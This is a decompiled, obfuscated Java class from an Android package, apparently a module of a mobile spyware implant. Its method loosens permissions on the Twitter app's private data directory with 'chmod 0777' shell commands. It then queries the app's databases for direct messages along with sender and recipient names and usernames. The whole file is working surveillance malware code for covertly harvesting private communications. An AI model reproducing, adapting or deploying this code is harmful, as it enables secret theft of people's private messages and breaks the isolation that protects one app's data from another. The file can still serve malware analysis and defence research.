package com.network.android.d;

import android.content.Context;
import android.os.Handler;
import com.network.android.c.a.a;
import com.network.android.p;
import java.io.File;
import java.util.Map;
import java.util.regex.Pattern;

public final class g extends p {
    protected static final Pattern c = Pattern.compile("\\d{4,}+\\-\\d+\\.db$");
    protected static final Map d;
    static final String e;

    static {
        h hVar = new h();
        d = hVar;
        e = (String) hVar.get("timestamp");
    }

    public static void a(Handler handler, Context context, boolean z) {
        try {
            a.a("getTwitterApp getTwitterApp start");
            for (String str : a("/data/data/com.twitter.android/databases/", c, "twitter")) {
                a(handler, context, z, "twitter", "/data/data/com.twitter.android/", str, "SELECT messages._id, messages.type, messages.msg_id, messages.content, messages.created, messages.sender_id, messages.recipient_id, messages.thread, s.name, s.username, r.name, r.username FROM messages JOIN users s ON messages.sender_id = s.user_id JOIN users r ON messages.recipient_id = r.user_id", "messages.created", "chmod 0777 /data/data/com.twitter.android; chmod 0777 /data/data/com.twitter.android/databases; ", e, d, 3132, new File(str).getName());
            }
            a.a("getTwitterApp GetContentIM end");
        } catch (Throwable th) {
            a.a("twittergetTwitterApp GetContentIM exception- " + th.getMessage(), th);
        }
    }
}
